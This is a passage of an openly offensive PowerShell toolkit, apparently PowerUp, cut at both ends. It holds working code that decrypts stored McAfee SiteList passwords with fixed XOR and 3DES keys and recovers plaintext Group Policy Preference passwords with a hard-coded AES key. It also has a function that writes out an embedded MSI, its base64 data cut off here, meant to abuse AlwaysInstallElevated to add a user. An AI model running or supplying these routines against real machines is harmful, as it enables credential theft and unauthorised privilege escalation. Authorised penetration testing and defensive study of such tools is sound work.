            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            # xor the input b64 string with the static XOR key
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            # build the static McAfee 3DES key TROLOL
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

            # set the options we need
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            # decrypt the unXor'ed block
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            # ignore the padding for the result
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if ($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistField {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if ($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'#Text'

                            if ($_.Password.Encrypted -eq 1) {
                                # decrypt the base64 password if it's marked as encrypted
                                $DecPassword = if ($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if ($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if ($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            $Out = New-Object -TypeName PSObject -Property $ObjectProperties
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.SiteListPassword')
                            $Out
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistField -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {
<#
.SYNOPSIS

Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and
left in cached files on the host.

Author: Chris Campbell (@obscuresec)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and
datasources.xml files and returns plaintext passwords.

.EXAMPLE

Get-CachedGPPPassword

NewName   : [BLANK]
Changed   : {2013-04-25 18:36:07}
Passwords : {Super!!!Password}
UserNames : {SuperSecretBackdoor}
File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
            C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
            oups.xml

.LINK

http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>

    [CmdletBinding()]
    Param()

    # Some XML issues between versions
    Set-StrictMode -Version 2

    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core

    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )

        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)

            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch {
            Write-Error $Error[0]
        }
    }

    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()

            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){

                Write-Verbose "Potential password in $File"

                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }

           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }

            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}

            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}

            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }

        catch {Write-Error $Error[0]}
    }

    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }

        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }

    catch {
        Write-Error $Error[0]
    }
}


function Write-UserAddMSI {
<#
.SYNOPSIS

Writes out a precompiled MSI installer that prompts for a user/group addition.
This function can be used to abuse Get-RegistryAlwaysInstallElevated.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Writes out a precompiled MSI installer that prompts for a user/group addition.
This function can be used to abuse Get-RegistryAlwaysInstallElevated.

.EXAMPLE

Write-UserAddMSI

Writes the user add MSI to the local directory.

.OUTPUTS

PowerUp.UserAddMSI
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.UserAddMSI')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path = 'UserAdd.msi'
    )

    $Binary = '0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgAEAP7/DAAGAAAAAAAAAAEAAAABAAAAAQAAAAAAAAAAEAAAAgAAAAEAAAD+////AAAAAAAAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP3////+/////v///y8AAAAFAAAABgAAAP7///8IAAAACQAAAAoAAAALAAAADAAAAA0AAAAOAAAADwAAABAAAAARAAAAEgAAABMAAAAUAAAAFQAAACwAAAAYAAAAFgAAABkAAAAaAAAAGwAAABwAAAAdAAAAHgAAAB8AAAAgAAAAIQAAACIAAAAjAAAAJAAAACUAAAAmAAAAJwAAACgAAAApAAAAKgAAACsAAAD+////LQAAAC4AAAAwAAAA/v///zEAAAD+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9SAG8AbwB0ACAARQBuAHQAcgB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAFAP//////////AgAAAIQQDAAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAABQSJaT62LPAQMAAABAFwAAAAAAAAUAUwB1AG0AbQBhAHIAeQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAIBEAAAABkAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANgBAAAAAAAAQEj/P+RD7EHkRaxEMUgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAgEVAAAAAwAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAEAgAAAAAAABASMpBMEOxOztCJkY3QhxCNEZoRCZCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAACAQQAAAABAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACoAAAAwAAAAAAAAAEBIykEwQ7E/Ej8oRThCsUEoSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAIBEgAAAA0AAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKwAAABgAAAAAAAAAQEjKQflFzkaoQfhFKD8oRThCsUEoSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAgH///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAKgAAAAAAAABASAtDMUE1RwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgACARMAAAAWAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFkAAAAIAAAAAAAAAEBIfz9kQS9CNkgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAIBBgAAAAwAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWgAAACYAAAAAAAAAC0MxQTVHfkG9RwxG9kUyRIpBN0NyRM1DL0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAgH/////DwAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXAAAAAFgBAAAAAABASIxE8ERyRGhEN0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAMAAAAAAAAAEBIDEb2RTJEikE3Q3JEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALwAAADwAAAAAAAAAQEgNQzVC5kVyRTxIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAgEOAAAAGAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAEgAAAAAAAABASA9C5EV4RShIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEAAAAQAAAAAAAAAEBID0LkRXhFKDsyRLNEMULxRTZIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAIB/////xEAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMgAAAAQAAAAAAAAAQEhZRfJEaEU3RwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAgEUAAAA//////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABXAAAAWAAAAAAAAAALQzFBNUd+Qb1HYEXkRDNCJz/oRfhEWUWyQjVBMEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAOAEAAAAA